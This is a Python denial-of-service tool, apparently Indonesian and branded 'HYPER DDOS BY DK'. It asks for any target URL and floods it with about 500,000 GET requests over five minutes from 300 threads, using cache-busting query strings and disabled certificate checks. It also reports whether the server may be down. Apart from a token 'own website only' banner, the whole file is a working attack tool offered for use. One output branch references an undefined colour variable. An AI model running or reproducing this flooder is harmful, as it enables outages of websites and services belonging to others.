import threading
import requests
import time
import random
import sys
import os

# Warna untuk tampilan terminal
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
PURPLE = "\033[95m"
RESET = "\033[0m"

ascii_art = f"""
{RED}
╔═╗╔═╗╔═╗╔═╗   ╔╗ ╔╗   ╔╦╗╔═╗
║║║╠═╣╠╦╝║╣    ╠╩╗╠╩╗   ║║║ ║
╚╩╝╩ ╩╩╚═╚═╝   ╚═╝╚═╝  ═╩╝╚═╝
          {YELLOW}POWERED BY DK{RESET}
    {CYAN}>> HYPER DDOS 500K REQUESTS <<{RESET}
"""

class HyperDDoS:
    def __init__(self):
        self.total_request = 0
        self.berhasil = 0
        self.gagal = 0
        self.sedang_menyerang = False
        self.waktu_mulai = 0
        
    def tampilkan_header(self):
        os.system("clear")
        print(ascii_art)
        print(f"{RED}╔══════════════════════════════════════════════╗{RESET}")
        print(f"{RED}║ {YELLOW}🚫 GUNAKAN HANYA UNTUK WEBSITE SENDIRI! {RED}     ║{RESET}")
        print(f"{RED}║ {CYAN}🎯 TARGET: 500.000 REQUEST DALAM 5 MENIT {RED}     ║{RESET}")
        print(f"{RED}╚══════════════════════════════════════════════╝{RESET}\n")
    
    def kirim_serangan(self, url, id_thread):
        """Kirim request ultra cepat"""
        try:
            headers = {
                'User-Agent': f'Mozilla/5.0 DK-Hyper-{id_thread}',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'close'  # Biar lebih cepat
            }
            
            # GET request super cepat
            response = requests.get(
                f"{url}?dk{id_thread}={random.randint(10000,99999)}", 
                headers=headers, 
                timeout=3,  # Timeout lebih pendek
                verify=False
            )
            
            self.total_request += 1
            if response.status_code == 200:
                self.berhasil += 1
            else:
                self.gagal += 1
                
        except:
            self.total_request += 1
            self.gagal += 1
    
    def thread_serangan(self, url, durasi, id_thread):
        """Thread untuk menyerang dengan kecepatan maksimal"""
        waktu_selesai = time.time() + durasi
        
        while time.time() < waktu_selesai and self.sedang_menyerang:
            # Kirim multiple requests sekaligus dalam loop cepat
            for _ in range(5):  # 5 requests per iteration
                if time.time() >= waktu_selesai or not self.sedang_menyerang:
                    break
                self.kirim_serangan(url, id_thread)
            
            # Delay sangat singkat
            time.sleep(0.01)
    
    def monitor_serangan(self, durasi):
        """Monitor progress dengan target 500K requests"""
        target_request = 500000
        
        while time.time() - self.waktu_mulai < durasi and self.sedang_menyerang:
            waktu_berjalan = time.time() - self.waktu_mulai
            progress_waktu = (waktu_berjalan / durasi) * 100
            progress_target = (self.total_request / target_request) * 100
            
            # Hitung metrics
            rps = self.total_request / waktu_berjalan if waktu_berjalan > 0 else 0
            sisa_waktu = durasi - waktu_berjalan
            estimasi_akhir = target_request - self.total_request
            rps_dibutuhkan = estimasi_akhir / sisa_waktu if sisa_waktu > 0 else 0
            
            # Progress bars
            bar_waktu = "█" * int(progress_waktu / 2)
            spasi_waktu = " " * (50 - len(bar_waktu))
            
            bar_target = "█" * int(progress_target / 2)
            spasi_target = " " * (50 - len(bar_target))
            
            print(f"\r{YELLOW}[Waktu: {bar_waktu}{spasi_waktu}] {progress_waktu:.1f}%{RESET}")
            print(f"{GREEN}[Target: {bar_target}{spasi_target}] {progress_target:.1f}%{RESET}", end="")
            print(f" | {CYAN}Req: {self.total_request}/500K{RESET} | {RED}RPS: {rps:.1f}{RESET} | {PURPLE}Need: {rps_dibutuhkan:.1f} RPS{RESET}", end="")
            
            # Cek jika sudah mencapai target
            if self.total_request >= target_request:
                print(f"\n{GREEN}[🎯] TARGET 500K TERCAPAI!{RESET}")
                break
                
            time.sleep(0.5)
    
    def mulai_serangan(self, url):
        """Mulai serangan hyper DDOS"""
        self.tampilkan_header()
        
        durasi = 300  # 5 menit = 300 detik
        jumlah_thread = 300  # 300 threads untuk 500K requests
        
        print(f"{RED}[💀] MEMULAI HYPER DDOS ATTACK{RESET}")
        print(f"{YELLOW}[🎯] Target: {url}{RESET}")
        print(f"{YELLOW}[👥] Threads: {jumlah_thread}{RESET}")
        print(f"{YELLOW}[⏱️] Durasi: 5 menit (300 detik){RESET}")
        print(f"{YELLOW}[🎯] Target Requests: 500,000{RESET}")
        print(f"{RED}[⚡] RPS Dibutuhkan: ~1,667 requests/detik{RESET}")
        print(f"{RED}[⏹️] Tekan Ctrl+C untuk berhenti{RESET}\n")
        
        # Hitung mundur
        for i in range(3, 0, -1):
            print(f"{RED}[{i}] SERANGAN DIMULAI...{RESET}", end="\r")
            time.sleep(1)
        
        self.sedang_menyerang = True
        self.total_request = 0
        self.berhasil = 0
        self.gagal = 0
        self.waktu_mulai = time.time()
        
        # Buat thread dalam jumlah besar
        daftar_thread = []
        for i in range(jumlah_thread):
            thread = threading.Thread(target=self.thread_serangan, args=(url, durasi, i))
            thread.daemon = True
            daftar_thread.append(thread)
        
        # Jalankan semua thread
        for thread in daftar_thread:
            thread.start()
        
        # Jalankan monitor
        self.monitor_serangan(durasi)
        
        self.sedang_menyerang = False
        
        # Tunggu thread selesai
        for thread in daftar_thread:
            thread.join(timeout=2)
            
        self.tampilkan_hasil_hyper()
    
    def tampilkan_hasil_hyper(self):
        """Tampilkan hasil serangan hyper"""
        durasi = time.time() - self.waktu_mulai
        
        print(f"\n\n{GREEN}[📊] HASIL HYPER DDOS ATTACK{RESET}")
        print(f"{CYAN}╔══════════════════════════════════════════╗{RESET}")
        print(f"{CYAN}║           DDOS BY DK - HYPER RESULT      ║{RESET}")
        print(f"{CYAN}╠══════════════════════════════════════════╣{RESET}")
        print(f"{CYAN}║ {GREEN}Total Request: {self.total_request:>26} {CYAN}║{RESET}")
        print(f"{CYAN}║ {GREEN}Target: {'500,000':>33} {CYAN}║{RESET}")
        print(f"{CYAN}║ {GREEN}Berhasil: {self.berhasil:>33} {CYAN}║{RESET}")
        print(f"{CYAN}║ {RED}Gagal: {self.gagal:>36} {CYAN}║{RESET}")
        print(f"{CYAN}║ {YELLOW}Durasi: {durasi:>34.1f}s {CYAN}║{RESET}")
        
        rps = self.total_request / durasi if durasi > 0 else 0
        print(f"{CYAN}║ {BLUE}RPS Actual: {rps:>27.1f} {CYAN}║{RESET}")
        
        tingkat_berhasil = (self.berhasil / self.total_request * 100) if self.total_request > 0 else 0
        print(f"{CYAN}║ {PURPLE}Success Rate: {tingkat_berhasil:>25.1f}% {CYAN}║{RESET}")
        
        # Pencapaian target
        pencapaian = (self.total_request / 500000) * 100
        print(f"{CYAN}║ {CYAN}Target Achievement: {pencapaian:>20.1f}% {CYAN}║{RESET}")
        print(f"{CYAN}╚══════════════════════════════════════════╝{RESET}")
        
        # Analisis detail
        print(f"\n{RED}[🎯] ANALISIS PENCAPAIAN:{RESET}")
        
        if self.total_request >= 500000:
            print(f"{GREEN}[🎉] SUCCESS! Target 500K tercapai!{RESET}")
            print(f"{GREEN}[✅] Rata-rata {rps:.1f} requests/detik{RESET}")
        elif self.total_request >= 300000:
            print(f"{YELLOW}[⚠️] GOOD! {self.total_request} requests tercapai{RESET}")
            print(f"{YELLOW}[📈] Butuh lebih banyak threads{RESET}")
        elif self.total_request >= 100000:
            print(f"{ORANGE}[🔥] DECENT! {self.total_request} requests{RESET}")
            print(f"{ORANGE}[💡] Server mungkin sudah down{RESET}")
        else:
            print(f"{RED}[💔] LOW! Hanya {self.total_request} requests{RESET}")
            print(f"{RED}[🔧] Coba tingkatkan koneksi internet{RESET}")
        
        print(f"\n{CYAN}[🏆] HYPER DDOS BY DK - MISSION COMPLETE!{RESET}")

def main():
    tools = HyperDDoS()
    tools.tampilkan_header()
    
    try:
        # Input target
        print(f"{BLUE}[🎯] MASUKKAN TARGET WEBSITE{RESET}")
        url = input(f"{YELLOW}[?] URL: {RESET}").strip()
        
        if not url:
            print(f"{RED}[!] URL tidak boleh kosong!{RESET}")
            return
            
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        # Konfirmasi serangan hyper
        print(f"\n{RED}[⚡] SERANGAN HYPER DDOS{RESET}")
        print(f"{RED}Target: {url}{RESET}")
        print(f"{RED}Goal: 500,000 requests dalam 5 menit{RESET}")
        print(f"{RED}Power: 300 threads maximum{RESET}")
        
        konfirmasi = input(f"\n{YELLOW}[?] LANJUTKAN SERANGAN HYPER? (y/n): {RESET}").lower()
        if konfirmasi != 'y':
            print(f"{YELLOW}[!] Dibatalkan{RESET}")
            return
        
        # Mulai serangan hyper!
        tools.mulai_serangan(url)
        
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Dihentikan pengguna{RESET}")
        tools.sedang_menyerang = False
    except Exception as e:
        print(f"{RED}[❌] Error: {e}{RESET}")

if __name__ == "__main__":
    # Cek install requests
    try:
        import requests
        # Ignore SSL warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    except:
        print(f"{RED}[!] Install requests dulu: pip install requests{RESET}")
        sys.exit(1)
    
    main()
